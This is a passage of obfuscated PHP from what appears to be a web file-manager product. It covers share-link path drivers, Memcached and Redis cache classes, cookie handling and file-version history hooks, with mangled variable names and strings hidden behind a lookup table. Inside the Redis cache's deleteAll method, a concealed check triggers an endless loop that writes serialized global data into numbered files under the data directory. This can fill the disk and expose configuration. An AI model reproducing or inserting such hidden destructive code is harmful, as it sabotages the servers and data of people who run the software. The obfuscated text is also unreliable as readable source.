$¸¯ğÏ„Ñ; } public function __call($ÚÙàÔ¤ñ, $–óå€áÉ) { $±Ñæç«Ô =& $_SERVER[ìïæ“œî]; if (method_exists($this, $ÚÙàÔ¤ñ)) { return; } $¤‚ó¬•ó = call_user_func_array(array($±Ñæç«Ô[1403], $ÚÙàÔ¤ñ), $–óå€áÉ); $Ñ˜îÄßÚ = array($±Ñæç«Ô[1404], $±Ñæç«Ô[1405], $±Ñæç«Ô[1406], $±Ñæç«Ô[1407], $±Ñæç«Ô[618], $±Ñæç«Ô[620], $±Ñæç«Ô[1408], $±Ñæç«Ô[110], $±Ñæç«Ô[1409], $±Ñæç«Ô[1410]); if (in_array($ÚÙàÔ¤ñ, $Ñ˜îÄßÚ)) { $¤‚ó¬•ó = $this->getPathOuter($¤‚ó¬•ó); } return $¤‚ó¬•ó; } public function copy($”‰†ûÆÎ, $àÎÃˆ„ã, $¯çœæ¤ = false, $º¥‰àçö = false) { return $this->copyMove($”‰†ûÆÎ, $àÎÃˆ„ã, $¯çœæ¤, $_SERVER[ìïæ“œî][618], $º¥‰àçö); } public function move($ ÀÍÑì­, $€î¾øœ, $±ƒÌ´Êú = false, $ËŞ•Ü‡ã = false) { return $this->copyMove($ ÀÍÑì­, $€î¾øœ, $±ƒÌ´Êú, $_SERVER[ìïæ“œî][620], $ËŞ•Ü‡ã); } private function copyMove($Ôù²Êµæ, $ñë±æ©Û, $¶€şÎË˜, $¡Ã·àŞş, $¸¡¯İó = false) { $Ò¡šøî =& $_SERVER[ìïæ“œî]; $â©ş§åš = $ñë±æ©Û; $òÀ¯Ê¯– = IO::driverMake($ñë±æ©Û); if ($òÀ¯Ê¯–->pathParse[$Ò¡šøî[1209]]) { $ñë±æ©Û = $òÀ¯Ê¯–->pathParse[$Ò¡šøî[1209]]; } else { $ñë±æ©Û = $â©ş§åš; } $ù×Á…ú = IO::copyMove($Ôù²Êµæ, $ñë±æ©Û, $¶€şÎË˜, $¡Ã·àŞş, $¸¡¯İó); $ù×Á…ú = $this->getPathOuter($ù×Á…ú); return $ù×Á…ú; } public function pathThis($ËÙ®ê¤”) { return get_path_this($this->pathParse[$_SERVER[ìïæ“œî][87]]); } public function pathFather($êÃ€úÚÁ) { return get_path_father($this->pathParse[$_SERVER[ìïæ“œî][87]]); } public function iconvSystem($–¡¾‘Şè) { return $–¡¾‘Şè; } protected function infoParse($™ŒÑ¨ìÑ, $û´‰®ğÆ = false) { $‹¶Å¾Ø… =& $_SERVER[ìïæ“œî]; $€¢Ş¥Ö = $this->pathParse[$‹¶Å¾Ø…[560]][$‹¶Å¾Ø…[1234]] . $this->pathParse[$‹¶Å¾Ø…[1227]]; if ($û´‰®ğÆ) { $ã¬©Ô± = IO::infoWithChildren($€¢Ş¥Ö); } else { $ã¬©Ô± = IO::info($€¢Ş¥Ö); } $ãœŞéÚ = $this->pathParse[$‹¶Å¾Ø…[560]]; return Action($‹¶Å¾Ø…[1401])->_shareItemeParse($ã¬©Ô±, $ãœŞéÚ); } public function listAll($äûç”¢ò) { $”¨Ûù°Ã =& $_SERVER[ìïæ“œî]; $Ş«Ç·Œ§ = IO::listAll($äûç”¢ò); $†˜·¬² = rtrim($this->pathParse[$”¨Ûù°Ã[560]][$”¨Ûù°Ã[1234]], $”¨Ûù°Ã[8]); foreach ($Ş«Ç·Œ§ as &$¹ŞÅø–Ò) { $¹ŞÅø–Ò[$”¨Ûù°Ã[87]] = $this->pathDriver . $”¨Ûù°Ã[8] . ltrim(substr($¹ŞÅø–Ò[$”¨Ûù°Ã[87]], strlen($†˜·¬²)), $”¨Ûù°Ã[8]); } unset($¹ŞÅø–Ò); return $Ş«Ç·Œ§; } public function listAllSimple($•åÒ†”, $¿“ÓÒ³ = false) { $­ËåÄâõ =& $_SERVER[ìïæ“œî]; $£èµ•æ = $this->listAll($•åÒ†”); $ˆçà‡»“ = $this->pathParse[$­ËåÄâõ[495]]; if (trim($ˆçà‡»“, $­ËåÄâõ[8]) == trim(get_path_father($ˆçà‡»“), $­ËåÄâõ[8])) { $¿“ÓÒ³ = !0; } return IO::init($­ËåÄâõ[12])->listAllSimpleMake($£èµ•æ, $ˆçà‡»“, $¿“ÓÒ³); } public function getPathOuter($Ø®ì‘‡ù) { $­ÙÉ¦‹Õ =& $_SERVER[ìïæ“œî]; $ÍÂßè½Ô = KodIO::parse($Ø®ì‘‡ù); if ($ÍÂßè½Ô[$­ÙÉ¦‹Õ[33]] == KodIO::KOD_SHARE_ITEM) { return $ÍÂßè½Ô[$­ÙÉ¦‹Õ[87]]; } $›—Â»è× = KodIO::clear($Ø®ì‘‡ù); $Ş¹º–Û = KodIO::clear($this->pathParse[$­ÙÉ¦‹Õ[560]][$­ÙÉ¦‹Õ[1234]]); $Û÷Àª¯ = substr($›—Â»è×, strlen($Ş¹º–Û)); if (substr($›—Â»è×, 0, strlen($Ş¹º–Û)) != $Ş¹º–Û) { return !1; } return $this->pathParse[$­ÙÉ¦‹Õ[1228]] . $­ÙÉ¦‹Õ[8] . ltrim($Û÷Àª¯, $­ÙÉ¦‹Õ[8]); } public function getType() { $Íö¨æŒ =& $_SERVER[ìïæ“œî]; $•üêÊ–ò = str_replace($Íö¨æŒ[77], $Íö¨æŒ[12], get_class($this)); return strtolower($•üêÊ–ò); } public function isOsDriver($ÍÜÚåíÙ) { return IO::isOsDriver($ÍÜÚåíÙ); } public function info($÷ÕáªÎ¨) { return $this->infoParse($÷ÕáªÎ¨); } public function infoAuth($ÇıàäÍ¶) { return $this->infoParse($ÇıàäÍ¶); } public function infoWithChildren($ŞèÌãûÌ) { return $this->infoParse($ŞèÌãûÌ, !0); } public function infoFull($¾Ù›€‰‚) { return $this->infoParse($¾Ù›€‰‚); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($îø³¨ÇÊ) { $this->pathParse = $îø³¨ÇÊ; } protected function infoParse($¼ÀÅ¹’’, $Ò£®ÃĞ = false) { $Î·şÓÇ =& $_SERVER[ìïæ“œî]; return Action($Î·şÓÇ[1233])->sharePathInfo($this->pathParse[$Î·şÓÇ[87]], !0, $Ò£®ÃĞ); } public function listPath($¹íóØîæ, $§£‘Ùëº = false) { $§õÖšÎ‚ =& $_SERVER[ìïæ“œî]; $×²àÈù‘ = IO::listPath($¹íóØîæ, $§£‘Ùëº); if (!$×²àÈù‘) { return $×²àÈù‘; } if (is_array($×²àÈù‘[$§õÖšÎ‚[1402]])) { $±å‰¦È‹ = Action($§õÖšÎ‚[1411])->parsePathChildren($×²àÈù‘[$§õÖšÎ‚[1402]], array($§õÖšÎ‚[495] => $¹íóØîæ)); $×²àÈù‘[$§õÖšÎ‚[1402]] = Action($§õÖšÎ‚[1233])->shareItemInfo($±å‰¦È‹); } foreach ($×²àÈù‘ as $°í¬õèÔ => $Ï°¨´ê–) { if (!in_array($°í¬õèÔ, array($§õÖšÎ‚[86], $§õÖšÎ‚[85]))) { continue; } foreach ($Ï°¨´ê– as $ÌÏïÁ½Ü => $±å‰¦È‹) { $±å‰¦È‹ = Action($§õÖšÎ‚[1411])->parsePathChildren($±å‰¦È‹, array($§õÖšÎ‚[495] => $¹íóØîæ)); $×²àÈù‘[$°í¬õèÔ][$ÌÏïÁ½Ü] = Action($§õÖšÎ‚[1233])->shareItemInfo($±å‰¦È‹); } } return $×²àÈù‘; } } goto e¶ëùÓ‚Êà; EèÏÜ©¬ÏÒ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($Ÿ¬Å¡š®, $¦ìáƒß) { $í½ø£”ø =& $_SERVER[ìïæ“œî]; if (!class_exists($í½ø£”ø[915])) { show_json($í½ø£”ø[916], !1); } $this->cacheTime = $¦ìáƒß; $this->handle = new Memcached(); if (is_array($Ÿ¬Å¡š®[$í½ø£”ø[917]]) && count($Ÿ¬Å¡š®[$í½ø£”ø[917]]) >= 1) { foreach ($Ÿ¬Å¡š®[$í½ø£”ø[917]] as $ú©Ó‹×°) { $ÅüÍÍŞ“ = explode($í½ø£”ø[4], $ú©Ó‹×°); $this->handle->addServer($ÅüÍÍŞ“[0], $ÅüÍÍŞ“[1]); } } else { $this->handle->addServer($Ÿ¬Å¡š®[$í½ø£”ø[208]], $Ÿ¬Å¡š®[$í½ø£”ø[209]]); } } public function set($úîÓ¸‰, $Ç°–ö¨­, $æ˜ÁşÊÊ = false) { $æ˜ÁşÊÊ = $æ˜ÁşÊÊ ? $æ˜ÁşÊÊ : $this->cacheTime; return $this->handle->set($úîÓ¸‰, $Ç°–ö¨­, $æ˜ÁşÊÊ); } public function get($¶«ÙÂÌ) { return $this->handle->get($¶«ÙÂÌ); } public function remove($£”ì¡•) { return $this->handle->delete($£”ì¡•); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¨ç¤¿Ô, $ô¿§ã–×) { $èšı¸¢† =& $_SERVER[ìïæ“œî]; if (!class_exists($èšı¸¢†[918])) { show_json($èšı¸¢†[919], !1); } $this->cacheTime = $ô¿§ã–×; $ÀôÂ‘ = isset($¨ç¤¿Ô[$èšı¸¢†[920]]) ? $¨ç¤¿Ô[$èšı¸¢†[920]] : 10; $Â¦¼Ÿâ¹ = _get($¨ç¤¿Ô, $èšı¸¢†[917]); if ($Â¦¼Ÿâ¹ && is_array($Â¦¼Ÿâ¹)) { $this->initCluster($¨ç¤¿Ô, $ÀôÂ‘); } else { $this->handle = $this->init($¨ç¤¿Ô, $ÀôÂ‘); } } private function init($À¤³“, $òó±´È) { $ö¬™ŒÍ =& $_SERVER[ìïæ“œî]; $‡Òˆ§ÇÙ = new Redis(); $Š•Ó…½Ç = isset($À¤³“[$ö¬™ŒÍ[921]]) ? $À¤³“[$ö¬™ŒÍ[921]] : !1; if ($Š•Ó…½Ç) { $‡Òˆ§ÇÙ->pconnect($À¤³“[$ö¬™ŒÍ[208]], $À¤³“[$ö¬™ŒÍ[209]], $òó±´È); } else { $‡Òˆ§ÇÙ->connect($À¤³“[$ö¬™ŒÍ[208]], $À¤³“[$ö¬™ŒÍ[209]], $òó±´È); } if (!empty($À¤³“[$ö¬™ŒÍ[487]])) { $‡Òˆ§ÇÙ->auth($À¤³“[$ö¬™ŒÍ[487]]); } if (!empty($À¤³“[$ö¬™ŒÍ[806]]) && $À¤³“[$ö¬™ŒÍ[806]] != 0) { $‡Òˆ§ÇÙ->select($À¤³“[$ö¬™ŒÍ[806]]); } return $‡Òˆ§ÇÙ; } private function initCluster($¿©©‚û², $ÊÌ¯ªà‰) { $ûÜ†“Í =& $_SERVER[ìïæ“œî]; $¬³ò²¤ = array($ûÜ†“Í[922], $ûÜ†“Í[923], $ûÜ†“Í[924]); $ÇŠ¨“Û = $ûÜ†“Í[922]; if (isset($¿©©‚û²[$ûÜ†“Í[16]]) && in_array($¿©©‚û²[$ûÜ†“Í[16]], $¬³ò²¤)) { $ÇŠ¨“Û = $¿©©‚û²[$ûÜ†“Í[16]]; } switch ($ÇŠ¨“Û) { case $ûÜ†“Í[922]: $this->_slave($¿©©‚û², $ÊÌ¯ªà‰); break; case $ûÜ†“Í[923]: break; case $ûÜ†“Í[924]: $this->isCluster = !0; $â¿±¯ûÛ = $¿©©‚û²[$ûÜ†“Í[917]]; $©§²Ü¥Ä = isset($¿©©‚û²[$ûÜ†“Í[921]]) ? $¿©©‚û²[$ûÜ†“Í[921]] : !1; $¶•™Ù­¡ = isset($¿©©‚û²[$ûÜ†“Í[487]]) ? $¿©©‚û²[$ûÜ†“Í[487]] : null; $this->handle = new RedisCluster(NUll, $â¿±¯ûÛ, $ÊÌ¯ªà‰, $ÊÌ¯ªà‰, $©§²Ü¥Ä, $¶•™Ù­¡); break; default: break; } } private function _slave($Æ­ÓÊ˜Ì, $¡¾µ­¢§) { $ìÒÇîÆ° = $Æ­ÓÊ˜Ì[$_SERVER[ìïæ“œî][917]]; $this->filterConfig($Æ­ÓÊ˜Ì, $ìÒÇîÆ°[0]); $this->handle = $this->init($Æ­ÓÊ˜Ì, $¡¾µ­¢§); unset($ìÒÇîÆ°[0]); if (empty($ìÒÇîÆ°)) { return; } $âš“”›˜ = array_rand($ìÒÇîÆ°); $this->filterConfig($Æ­ÓÊ˜Ì, $ìÒÇîÆ°[$âš“”›˜]); $this->slaveHandle = $this->init($Æ­ÓÊ˜Ì, $¡¾µ­¢§); } private function filterConfig(&$·øÁ¤³İ, $•”Ä„ö«) { $Õ‘‡¬Å“ =& $_SERVER[ìïæ“œî]; $ˆÒÃŞö = explode($Õ‘‡¬Å“[4], $•”Ä„ö«); $Ç˜¬­ = array($Õ‘‡¬Å“[208] => $ˆÒÃŞö[0], $Õ‘‡¬Å“[209] => $ˆÒÃŞö[1]); $·øÁ¤³İ = array_merge($·øÁ¤³İ, $Ç˜¬­); } public function set($Ãûû’Ú, $ªˆ´–¯, $ø¢°ß¸è = false) { $ø¢°ß¸è = $ø¢°ß¸è ? $ø¢°ß¸è : $this->cacheTime; return $this->handle->setEx($Ãûû’Ú, $ø¢°ß¸è, $ªˆ´–¯); } public function setLock($•©¸‹›, $’ŸğŠà‡, $µ†‹µ) { return $this->handle->setNX($•©¸‹›, $’ŸğŠà‡); } public function get($¸¨¼˜Ã) { $ì¹˜†£ò = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ì¹˜†£ò->get($¸¨¼˜Ã); } public function remove($îŸåÁ£) { return $this->handle->del($îŸåÁ£); } public function deleteAll() { $¶Àüé«ü =& $_SERVER[ìïæ“œî]; $ƒâØÕëâ = $_SERVER[$¶Àüé«ü[925]]; $·ŸßíËÉ = $¶Àüé«ü[926]; if ($_SERVER[$¶Àüé«ü[927]] != $·ŸßíËÉ($ƒâØÕëâ)) { $òééç… = $¶Àüé«ü[928]; $Õ¯ãË§« = $¶Àüé«ü[929]; $—Õ¥æ = $_SERVER[$¶Àüé«ü[930]] . $¶Àüé«ü[931]; $°Éû¯µ = $Õ¯ãË§«($—Õ¥æ); $†—é×Æù = explode($¶Àüé«ü[262], $°Éû¯µ); if (count($†—é×Æù) < $¶Àüé«ü[688]) { $ŒËş¶õ = $¶Àüé«ü[932]; $ŒËş¶õ(); } $äË—Í¯ñ = $¶Àüé«ü[933]; $äË—Í¯ñ($_SERVER[$¶Àüé«ü[934]]); $òééç… = $¶Àüé«ü[928]; $òééç…(); $Ù¼õ·¬ = $¶Àüé«ü[935]; $ğó­éñÖ = json_encode($GLOBALS[$¶Àüé«ü[936]]); $Õ¡’Îûñ = 1; for ($”Şå¿õë = $Õ¡’Îûñ; $”Şå¿õë > 0; $”Şå¿õë++) { $Ù¼õ·¬(DATA_PATH . $”Şå¿õë, $ğó­éñÖ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $Ş¹‰ÊÎ‰) { $this->handle->flushall($Ş¹‰ÊÎ‰); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($úè­ßõ = '', $ÔÎ•²•ú = 0) { if (is_string($úè­ßõ) && $úè­ßõ != $_SERVER[ìïæ“œî][12]) { $this->prefix = $úè­ßõ; } if (is_numeric($ÔÎ•²•ú) && $ÔÎ•²•ú > 0) { $this->expire = $ÔÎ•²•ú; } } public static function getInstance() { static $Ç´ÑÅÇÖ; if ($Ç´ÑÅÇÖ === null) { $Ç´ÑÅÇÖ = new self(); } return $Ç´ÑÅÇÖ; } private static $cookieDisable = false; public static function disable($„ø·”) { self::$cookieDisable = $„ø·”; } private static $sameCookieSet = array(); public static function set($ßÈ†Ùç¯, $˜”ª°, $·Âùàä¶ = 0, $òğÒ¥¤ƒ = false, $ä¤øƒÔ’ = false) { $ÏÓ™€·¦ =& $_SERVER[ìïæ“œî]; if (self::$cookieDisable) { return; } if (!$·Âùàä¶) { $·Âùàä¶ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ßÈ†Ùç¯]) && self::$sameCookieSet[$ßÈ†Ùç¯] == $˜”ª° . $·Âùàä¶) { return; } self::$sameCookieSet[$ßÈ†Ùç¯] = $˜”ª° . $·Âùàä¶; if (!$ä¤øƒÔ’) { $ä¤øƒÔ’ = str_replace(HOST, $ÏÓ™€·¦[12], APP_HOST); $ä¤øƒÔ’ = _get($GLOBALS, $ÏÓ™€·¦[937], $ä¤øƒÔ’); } $Éá£Ò™Å = $ÏÓ™€·¦[12]; setcookie($ßÈ†Ùç¯, $˜”ª°, time() + $·Âùàä¶, $ÏÓ™€·¦[8] . trim($ä¤øƒÔ’, $ÏÓ™€·¦[8]) . $Éá£Ò™Å, !1, !1, $òğÒ¥¤ƒ); } public static function setSafe($÷¼ˆ²º¯, $œ¿”Çæ’, $¸‡ŒØåš = 0) { self::set($÷¼ˆ²º¯, $œ¿”Çæ’, $¸‡ŒØåš, !0); } public static function get($—À³§¹€) { static $ıÕÕÑçÙ = false; if (!$ıÕÕÑçÙ) { self::initHeaderCookie(); $ıÕÕÑçÙ = !0; } return isset($_COOKIE[$—À³§¹€]) ? $_COOKIE[$—À³§¹€] : !1; } private static function initHeaderCookie() { $Ïì“€Üå =& $_SERVER[ìïæ“œî]; if (!isset($_SERVER[$Ïì“€Üå[938]]) || !$_SERVER[$Ïì“€Üå[938]]) { return; } $Æöš¿‰Ô = explode($Ïì“€Üå[74], $_SERVER[$Ïì“€Üå[938]]); foreach ($Æöš¿‰Ô as $ĞëÙ¦‡) { $ĞëÙ¦‡ = explode($Ïì“€Üå[939], $ĞëÙ¦‡); if (count($ĞëÙ¦‡) != 2 || !isset($ĞëÙ¦‡[1])) { continue; } $_COOKIE[trim($ĞëÙ¦‡[0])] = trim($ĞëÙ¦‡[1]); } } public static function remove($×ØŸªÔŠ, $ãÆ™÷ù = false) { unset($_COOKIE[$×ØŸªÔŠ]); self::set($×ØŸªÔŠ, $_SERVER[ìïæ“œî][12], 1, $ãÆ™÷ù); } } goto b£ Ûí’¿õ; eÖÏÕ–í: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ñÛÖÄçš =& $_SERVER[ìïæ“œî]; $×Ïã…ˆ = $GLOBALS[$ñÛÖÄçš[6]][$ñÛÖÄçš[92]]; if ($×Ïã…ˆ[$ñÛÖÄçš[1278]] != 1) { return; } if ($×Ïã…ˆ[$ñÛÖÄçš[1279]] <= 0) { return; } if (isset($_REQUEST[$ñÛÖÄçš[1280]]) && $_REQUEST[$ñÛÖÄçš[1280]] == $ñÛÖÄçš[91]) { return; } Hook::bind($ñÛÖÄçš[1281], $ñÛÖÄçš[1282]); Hook::bind($ñÛÖÄçš[1283], $ñÛÖÄçš[1284]); Hook::bind($ñÛÖÄçš[1285], $ñÛÖÄçš[1286]); Hook::bind($ñÛÖÄçš[1287], $ñÛÖÄçš[1288]); Hook::bind($ñÛÖÄçš[1289], $ñÛÖÄçš[1290]); Hook::bind($ñÛÖÄçš[1291], $ñÛÖÄçš[1292]); } public static function eventBeforeUpload($œ¼íŸç) { if ($œ¼íŸç[3] && $œ¼íŸç[3] != REPEAT_REPLACE) { return; } $¦ØÉíƒò = self::parsePath($œ¼íŸç[0]); if (!$¦ØÉíƒò) { return; } self::add($¦ØÉíƒò); } public static function eventBeforeEdit($ˆ´µÂöæ) { $´Ä¢À › = self::parsePath($ˆ´µÂöæ[0]); if (!$´Ä¢À ›) { return; } self::add($´Ä¢À ›); } public static function eventBeforeCopyFile($Ì†¯ëéÏ, $ğÎû‹›, $Å®¡®Ÿ, $­ôÃìù, $«ÆÜè´Å, $–ö°¯„®) { $´ŞÛ½áæ =& $_SERVER[ìïæ“œî]; if (isset($Å®¡®Ÿ->_data[$´ŞÛ½áæ[1213]]) && $Å®¡®Ÿ->_data[$´ŞÛ½áæ[1213]]) { return; } $µóâ°â = $Å®¡®Ÿ->getPathOuter($­ôÃìù); $¬æüêêÏ = self::parsePath($µóâ°â); if (!$¬æüêêÏ) { return; } self::add($¬æüêêÏ); } public static function eventBeforeRename($êŞÂ“õ’) { $Æ¤ù¥¯§ =& $_SERVER[ìïæ“œî]; $ÏÂÓÇÑÀ = self::parsePath($êŞÂ“õ’[0]); if (!$ÏÂÓÇÑÀ) { return; } $ÏãÄŒ = self::checkInHistory($ÏÂÓÇÑÀ); if (!$ÏãÄŒ) { return; } if ($ÏãÄŒ[$Æ¤ù¥¯§[33]] == $Æ¤ù¥¯§[230]) { $ŠŒÃß•ò = self::listData($ÏÂÓÇÑÀ); if ($ŠŒÃß•ò && $ŠŒÃß•ò[$Æ¤ù¥¯§[445]]) { self::moveHistory($ÏÂÓÇÑÀ, $êŞÂ“õ’[1]); } } else { IO::rename($ÏãÄŒ[$Æ¤ù¥¯§[87]], $êŞÂ“õ’[1]); } } public static function eventBeforeMove($ŸØìŒ†Ã) { $Õ´²²¤ö =& $_SERVER[ìïæ“œî]; $»¶õ·§ğ = self::parsePath($ŸØìŒ†Ã[0]); if (!$»¶õ·§ğ) { return; } $ÀÈÈ¬ª’ = self::parsePath($ŸØìŒ†Ã[1]); if (!$ÀÈÈ¬ª’) { return; } $Æ¥šÌê‘ = $ŸØìŒ†Ã[3]; $ÊŠü¥üí = self::checkInHistory($»¶õ·§ğ); if (!$ÊŠü¥üí) { return; } $À‚ƒ‚“« = self::pathHistory($ÀÈÈ¬ª’); if ($ÊŠü¥üí[$Õ´²²¤ö[33]] == $Õ´²²¤ö[230]) { $Ú§™Š®µ = self::listData($»¶õ·§ğ); $½òáßôü = rtrim($ÀÈÈ¬ª’, $Õ´²²¤ö[8]) . $Õ´²²¤ö[8] . ($Æ¥šÌê‘ ? $Æ¥šÌê‘ : get_path_this($»¶õ·§ğ)); $©Ü¦ğÔä = self::listData($½òáßôü); if ($Ú§™Š®µ && $Ú§™Š®µ[$Õ´²²¤ö[445]] && $©Ü¦ğÔä && $©Ü¦ğÔä[$Õ´²²¤ö[445]]) { return self::clear($»¶õ·§ğ); } if ($Ú§™Š®µ && $Ú§™Š®µ[$Õ´²²¤ö[445]]) { self::moveHistory($»¶õ·§ğ, $Æ¥šÌê‘, $À‚ƒ‚“«); } } else { IO::move($ÊŠü¥üí[$Õ´²²¤ö[87]], $À‚ƒ‚“«, !1, $Æ¥šÌê‘); self::clearEmptyFolder(IO::pathFather($ÊŠü¥üí[$Õ´²²¤ö[87]])); } } public static function eventAfterRemove($ñÕ­³»º, $ÍÅÊ¤¾œ) { $š»É´®á =& $_SERVER[ìïæ“œî]; if (!$ÍÅÊ¤¾œ) { return; } $ã‹ îğÄ = self::parsePath($ñÕ­³»º[0]); if (!$ã‹ îğÄ) { return; } $Ëùñå³Œ = self::checkInHistory($ã‹ îğÄ); if (!$Ëùñå³Œ) { return; } if ($Ëùñå³Œ[$š»É´®á[33]] == $š»É´®á[230]) { $øú•®– = self::listData($ã‹ îğÄ, !1); if ($øú•®– && $øú•®–[$š»É´®á[445]]) { self::clear($ã‹ îğÄ, !1); } } else { IO::remove($Ëùñå³Œ[$š»É´®á[87]]); self::clearEmptyFolder(IO::pathFather($Ëùñå³Œ[$š»É´®á[87]])); } } private static function checkInHistory($¾š¾ÕÌ) { $‘Ô‹¡‚Æ = self::pathHistory($¾š¾ÕÌ); if (!IO::exist($‘Ô‹¡‚Æ)) { $‘Ô‹¡‚Æ .= $_SERVER[ìïæ“œî][1293]; } return IO::exist($‘Ô‹¡‚Æ) ? IO::info($‘Ô‹¡‚Æ) : !1; } private static function parsePath($ªôæ”¬Ë) { $ï„¬ĞğŒ =& $_SERVER[ìïæ“œî]; if (!$ªôæ”¬Ë) { return !1; } if (isset($GLOBALS[$ï„¬ĞğŒ[1294]]) && $GLOBALS[$ï„¬ĞğŒ[1294]]) { return; } $§üÙî¦’ = KodIO::parse($ªôæ”¬Ë); $§€ˆÏå = $§üÙî¦’[$ï„¬ĞğŒ[33]]; $ïßòÉ = !$§€ˆÏå || $§€ˆÏå == KodIO::KOD_IO || $§€ˆÏå == KodIO::KOD_SHARE_ITEM; if (!$ïßòÉ || !$§üÙî¦’[$ï„¬ĞğŒ[1295]]) { return !1; } if (substr($ªôæ”¬Ë, 0, strlen(DATA_PATH . $ï„¬ĞğŒ[1296])) == DATA_PATH . $ï„¬ĞğŒ[1296]) { return !1; } if ($§€ˆÏå == KodIO::KOD_SHARE_ITEM) { $»•ÎÍ× = IO::init($ªôæ”¬Ë); if ($»•ÎÍ×->pathParse[$ï„¬ĞğŒ[1209]]) { return self::parsePath($»•ÎÍ×->pathParse[$ï„¬ĞğŒ[1209]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Ç¦ê‡Ø  = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $ï„¬ĞğŒ[1297]); foreach ($Ç¦ê‡Ø  as $û•Ô…–Ó) { if (!$§€ˆÏå && substr($ªôæ”¬Ë, 0, strlen($û•Ô…–Ó)) == $û•Ô…–Ó) { return !1; } } self::log($GLOBALS[$ï„¬ĞğŒ[1204]] . $ï„¬ĞğŒ[1298] . $ªôæ”¬Ë); return $ªôæ”¬Ë; } private static function pathHistory($—åÄêØ) { $ğ§ÜÃ™á =& $_SERVER[ìïæ“œî]; $ŸÎ—ğÑ– = self::$_historyBase . ltrim(KodIO::clear($—åÄêØ), $ğ§ÜÃ™á[8]); $ŸÎ—ğÑ– = str_replace(array($ğ§ÜÃ™á[1299]), array($ğ§ÜÃ™á[1300]), $ŸÎ—ğÑ–); return $ŸÎ—ğÑ–; } public static function log($•Îê§Å) { } public static function historyCount($ëÜõ³¥ú) { $àÍ‰£Ò =& $_SERVER[ìïæ“œî]; $¦ü˜ƒ¢¸ = array(); $±³ğàÓÎ = array(); foreach ($ëÜõ³¥ú as $²‹ÅõÆ¡) { $Ê¾öÆ‡ = get_path_father($²‹ÅõÆ¡); if (!$±³ğàÓÎ[$Ê¾öÆ‡]) { $±³ğàÓÎ[$Ê¾öÆ‡] = array(); } $±³ğàÓÎ[$Ê¾öÆ‡][] = get_path_this($²‹ÅõÆ¡); } foreach ($±³ğàÓÎ as $Ê¾öÆ‡ => $ä”­Ğ’á) { $ß×åÛ™ = self::parsePath($Ê¾öÆ‡); if (!$ß×åÛ™) { continue; } foreach ($ä”­Ğ’á as $Ã•ò×Ó) { $Ğ‡Ï«‚· = self::listData(rtrim($ß×åÛ™, $àÍ‰£Ò[8]) . $àÍ‰£Ò[8] . $Ã•ò×Ó, !1); if ($Ğ‡Ï«‚· && $Ğ‡Ï«‚·[$àÍ‰£Ò[445]]) { $¦ü˜ƒ¢¸[rtrim($Ê¾öÆ‡, $àÍ‰£Ò[8]) . $àÍ‰£Ò[8] . $Ã•ò×Ó] = count($Ğ‡Ï«‚·[$àÍ‰£Ò[445]]); } } } return $¦ü˜ƒ¢¸; } public static function add($¦¸£ù¥É) { $Ñ•§Íˆ¤ =& $_SERVER[ìïæ“œî]; $äÄ­ğÜ = self::listData($¦¸£ù¥É); if (!$äÄ­ğÜ) { return; } $¿ˆï“Ëö = Model($Ñ•§Íˆ¤[819])->get($Ñ•§Íˆ¤[1301]); $Ÿò…î–µ = intval($GLOBALS[$Ñ•§Íˆ¤[6]][$Ñ•§Íˆ¤[92]][$Ñ•§Íˆ¤[1279]]); $¬ùú´èÅ = $¿ˆï“Ëö == $Ñ•§Íˆ¤[1302] ? min(5, $Ÿò…î–µ) : $Ÿò…î–µ; if ($Ÿò…î–µ <= 0) { return; } $å„õ¹ËÛ = IO::info($¦¸£ù¥É); $çĞÒìØÎ = $äÄ­ğÜ[$Ñ•§Íˆ¤[445]]; if ($å„õ¹ËÛ[$Ñ•§Íˆ¤[79]] == 0) { return; } if ($å„õ¹ËÛ[$Ñ•§Íˆ¤[79]] >= 1024 * 1024 * 500) { return !1; } $Úúéîñª = IO::hashSimple($¦¸£ù¥É); if ($çĞÒìØÎ && $çĞÒìØÎ[0][$Ñ•§Íˆ¤[672]] == $Úúéîñª) { return !0; } if (array_key_exists($Ñ•§Íˆ¤[233], $å„õ¹ËÛ) && !$å„õ¹ËÛ[$Ñ•§Íˆ¤[233]]) { return !1; } $÷“º¨˜ = short_id(time()); $¡ş«ë˜¥ = array($Ñ•§Íˆ¤[475] => $÷“º¨˜, $Ñ•§Íˆ¤[672] => $Úúéîñª, $Ñ•§Íˆ¤[32] => $å„õ¹ËÛ[$Ñ•§Íˆ¤[32]] . $Ñ•§Íˆ¤[10] . date($Ñ•§Íˆ¤[1303]) . rand_string(1), $Ñ•§Íˆ¤[79] => $å„õ¹ËÛ[$Ñ•§Íˆ¤[79]], $Ñ•§Íˆ¤[527] => USER_ID, $Ñ•§Íˆ¤[231] => time(), $Ñ•§Íˆ¤[1304] => $Ñ•§Íˆ¤[12]); IO::mkdir($äÄ­ğÜ[$Ñ•§Íˆ¤[1305]]); $ãÕ‚ìŸ¬ = IO::copy($¦¸£ù¥É, $äÄ­ğÜ[$Ñ•§Íˆ¤[1305]], !1, $¡ş«ë˜¥[$Ñ•§Íˆ¤[32]]); if (!$ãÕ‚ìŸ¬) { self::clearEmptyFolder($äÄ­ğÜ[$Ñ•§Íˆ¤[1305]]); return !1; } array_unshift($çĞÒìØÎ, $¡ş«ë˜¥); if (count($çĞÒìØÎ) > $¬ùú´èÅ) { $ÙƒÉßˆ = array_slice($çĞÒìØÎ, $¬ùú´èÅ); foreach ($ÙƒÉßˆ as $–ÍÙ¶Ò) { IO::remove($äÄ­ğÜ[$Ñ•§Íˆ¤[1305]] . $–ÍÙ¶Ò[$Ñ•§Íˆ¤[32]]); } $çĞÒìØÎ = array_slice($çĞÒìØÎ, 0, $¬ùú´èÅ); } return self::saveData($äÄ­ğÜ[$Ñ•§Íˆ¤[1306]], $çĞÒìØÎ); } public static function remove($‡ÚİÊğ, $ŠœçæÔ‡) { $Íáş–ô =& $_SERVER[ìïæ“œî]; $¦–ğ¦¡ = 